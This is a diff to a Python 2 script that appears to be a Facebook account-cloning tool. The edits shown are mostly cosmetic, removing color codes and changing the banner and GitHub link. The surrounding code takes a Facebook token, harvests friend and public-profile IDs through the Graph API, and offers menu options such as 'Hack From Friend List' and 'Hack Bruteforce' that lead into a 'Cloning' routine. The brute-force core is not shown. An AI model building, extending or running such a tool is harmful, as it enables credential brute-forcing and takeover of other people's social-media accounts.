@@ -48,20 +48,20 @@ def jalan(z):
 
 ##### LOGO #####
 logo = """
+████████████████
+█░░░░░░██░░░░░░█
+█░░▄▀░░██░░▄▀░░█
+█░░▄▀░░██░░▄▀░░█
+█░░▄▀░░██░░▄▀░░█
+█░░▄▀░░░░░░▄▀░░█
+█░░▄▀▄▀▄▀▄▀▄▀░░█
+█░░▄▀░░░░░░▄▀░░█
+█░░▄▀░░██░░▄▀░░█
+█░░▄▀░░██░░▄▀░░█
+█░░▄▀░░██░░▄▀░░█
+█░░░░░░██░░░░░░█
+████████████████ """
 
-033[1;91m████████████████
-033[1;97m█░░░░░░██░░░░░░█
-033[1;91m█░░▄▀░░██░░▄▀░░█
-033[1;97m█░░▄▀░░██░░▄▀░░█
-033[1;91m█░░▄▀░░██░░▄▀░░█
-033[1;97m█░░▄▀░░░░░░▄▀░░█
-033[1;91m█░░▄▀▄▀▄▀▄▀▄▀░░█
-033[1;97m█░░▄▀░░░░░░▄▀░░█
-033[1;91m█░░▄▀░░██░░▄▀░░█
-033[1;97m█░░▄▀░░██░░▄▀░░█
-033[1;91m█░░▄▀░░██░░▄▀░░█
-033[1;97m█░░░░░░██░░░░░░█
-033[1;91m████████████████"""
 def tik():
 	titik = ['.   ','..  ','... ']
 	for o in titik:
@@ -79,30 +79,29 @@ vuln = "\033[32mVuln"
 
 os.system("clear")
 print  """
-033[1;91m████████████████
-033[1;91m█░░░░░░██░░░░░░█
-033[1;91m█░░▄▀░░██░░▄▀░░█
-033[1;91m█░░▄▀░░██░░▄▀░░█
-033[1;91m█░░▄▀░░██░░▄▀░░█
-033[1;91m█░░▄▀░░░░░░▄▀░░█
-033[1;91m█░░▄▀▄▀▄▀▄▀▄▀░░█
-033[1;91m█░░▄▀░░░░░░▄▀░░█
-033[1;91m█░░▄▀░░██░░▄▀░░█
-033[1;91m█░░▄▀░░██░░▄▀░░█
-033[1;91m█░░▄▀░░██░░▄▀░░█
-033[1;91m█░░░░░░██░░░░░░█
-033[1;91m████████████████  """                                  
-
-jalan("\033[1;97m•◈•───────•◈ HUZAIFA •◈•───────•◈•")  
+•◈•───────•◈ HUZAIFA •◈•───────•◈•
+████████████████
+█░░░░░░██░░░░░░█
+█░░▄▀░░██░░▄▀░░█
+█░░▄▀░░██░░▄▀░░█
+█░░▄▀░░██░░▄▀░░█
+█░░▄▀░░░░░░▄▀░░█
+█░░▄▀▄▀▄▀▄▀▄▀░░█
+█░░▄▀░░░░░░▄▀░░█
+█░░▄▀░░██░░▄▀░░█
+█░░▄▀░░██░░▄▀░░█
+█░░▄▀░░██░░▄▀░░█
+█░░░░░░██░░░░░░█
+████████████████
+•◈•───────•◈ HUZAIFA •◈•───────•◈• """
 jalan("\033[1;97m-----------------------------------------------")
 
 jalan("\033[1;97m➣ Coder   : Muhammad Huzaifa")
-jalan("\033[1;97m➣ Github  : https://github.com/Muhammad-Huzaifa-Khan")
+jalan("\033[1;97m➣ Github  : https://github.com/HUZ41F4")
 jalan("\033[1;97m➣ Facebook: Muhammad Huzaifa")
 jalan("\033[1;97m➣ Youtube : HK Tricker")
 
 jalan("\033[1;97m-----------------------------------------------")
-jalan("\033[1;97m•◈•───────•◈ HUZAIFA •◈•───────•◈•")
 
 CorrectUsername = "Huzaifa"
 CorrectPassword = "Huzaifa"
@@ -110,9 +109,9 @@ CorrectPassword = "Huzaifa"
 
 loop = 'true'
 while (loop == 'true'):
-    username = raw_input("\033[1;96m[☆] \x1b[1;97mUSER ID \x1b[1;96m>>>> ")
+    username = raw_input("\033[1;96m[☆] USER ID \x1b[1;96m>>>> ")
     if (username == CorrectUsername):
-    	password = raw_input("\033[1;96m[☆] \x1b[1;97mPASWORD \x1b[1;96m>>>> ")
+    	password = raw_input("\033[1;96m[☆] PASWORD \x1b[1;96m>>>> ")
         if (password == CorrectPassword):
             print "Logged in successfully as " + username
             loop = 'false'
@@ -134,9 +133,9 @@ def login():
 		print 50*"\033[1;96m▪"
 		
 		
-		print('          \033[1;97m[◉] \x1b[1;96mLogin New Fresh Account \033[1;97m[◉]' )
-		id = raw_input('          \033[1;97m[◉] \033[1;97mID/Email \x1b[1;91m: \x1b[1;92m')
-		pwd = raw_input('          \033[1;97m[◉] \033[1;97mPassword \x1b[1;91m: \x1b[1;92m')
+		print('          [◉] \x1b[1;96mLogin New Fresh Account [◉]' )
+		id = raw_input('     [◉] ID/Email : ')
+		pwd = raw_input('    [◉] Password : ')
 		tik()
 		try:
 			br.open('https://m.facebook.com')
@@ -212,14 +211,14 @@ def menu():
 		keluar()
 	os.system("clear")
 	print logo
-	print "   \033[1;36;40m      ╔═════════════════════════════════╗"
-	print "   \033[1;36;40m      ║\033[1;32;40m[*] Name\033[1;32;40m: "+nama+"  	   \033[1;36;40m║"                               
-	print "   \033[1;36;40m      ║\033[1;34;40m[*] ID  \033[1;34;40m: "+id+"        \033[1;36;40m║"
-	print "   \033[1;36;40m      ║\033[1;34;40m[*] Subs\033[1;34;40m: "+sub+"                      \033[1;36;40m║"
-	print "   \033[1;36;40m      ╚═════════════════════════════════╝"
-	print "\033[1;32;40m[1] \033[1;33;40mStart Hacking"	
-	print "\033[1;32;40m[2] \033[1;33;40mUpdate X"																														
-	print "\033[1;32;40m[0] \033[1;33;40mLog out"
+	print "         ╔═════════════════════════════════╗"
+	print "         ║[*] Name: "+nama+"  	               ║"                               
+	print "         ║[*] ID  : "+id+"                      ║"
+	print "         ║[*] Subs: "+sub+"                     ║"
+	print "         ╚═════════════════════════════════╝"
+	print "[1] Start Hacking"	
+	print "[2] Update x"																														
+	print "[0] Log out"
 	pilih()
 
 def pilih():
@@ -232,9 +231,9 @@ def pilih():
 	elif unikers =="2":
 		os.system('clear')
 		print logo
-		print " \033[1;36;40m●════════════════════════◄►════════════════════════●\n"
+		print " ●════════════════════════◄►════════════════════════●\n"
 		os.system('git pull origin master')
-		raw_input('\n\033[1;97m[ \033[1;97mBack \033[1;97m]')
+		raw_input('\n[ Back ]')
 		menu()
 	elif unikers =="0":
 		jalan('Token Removed')
@@ -256,11 +255,11 @@ def super():
 		login()
 	os.system('clear')
 	print logo
-	print "\x1b[1;32;40m[1] \x1b[1;43mHack From Friend List"
-	print "\x1b[1;32;40m[2] \x1b[1;43mHack From Public ID"
-	print "\x1b[1;32;40m[3] \x1b[1;43mHack Bruteforce"
-	print "\x1b[1;32;40m[4] \x1b[1;43mHack From File"
-	print "\x1b[1;32;40m[0] \x1b[1;43mBack"
+	print "[1] Hack From Friend List"
+	print "[2] Hack From Public ID"
+	print "[3] Hack Bruteforce"
+	print "[4] Hack From File"
+	print "[0] Back"
 	pilih_super()
 
 def pilih_super():
@@ -272,7 +271,7 @@ def pilih_super():
 		os.system('clear')
 		print logo
 
-		jalan('\033[1;97m[✺] Getting IDs \033[1;97m...')
+		jalan('[✺] Getting IDs ...')
 		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
 		z = json.loads(r.text)
 		for s in z['data']:
@@ -281,7 +280,7 @@ def pilih_super():
 	elif peak =="2":
 		os.system('clear')
 		print logo
-		idt = raw_input("\033[1;97m[*] Enter ID : ")
+		idt = raw_input("[*] Enter ID : ")
 		try:
 			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
 			op = json.loads(jok.text)
@@ -317,16 +316,15 @@ def pilih_super():
 		pilih_super()
 
 	
-	print "\033[1;36;40m[✺] Total IDs : \033[1;97m"+str(len(id))
-	jalan('\033[1;34;40m[✺] Please Wait...')
+	print "[✺] Total IDs : "+str(len(id))
+	jalan('[✺] Please Wait...')
 	titik = ['.   ','..  ','... ']
 	for o in titik:
-		print("\r\033[1;32;40m[✺] Cloning\033[1;97m"+o),;sys.stdout.flush();time.sleep(1)
-	print "\n\033[1;97m        ❈     \033[1;97mTo Stop Process Press CTRL+Z \033[1;97m    ❈"
-	print "   \033[1;31;48m●══════════════════◄►══════════════════●"
-
-	jalan('           \033[1;97mPLEASE WAIT...')
-	print  "  \033[1;36;48m●══════════════════◄►══════════════════●" 
+		print("\r[✺] Cloning"+o),;sys.stdout.flush();time.sleep(1)
+	print "\n        ❈     To Stop Process Press CTRL+Z     ❈"
+	print "   ●══════════════════◄►══════════════════●"
+	jalan('                   PLEASE WAIT...')
+	print  "  ●══════════════════◄►══════════════════●" 
 
 	def main(arg):
 		global cekpoint,oks
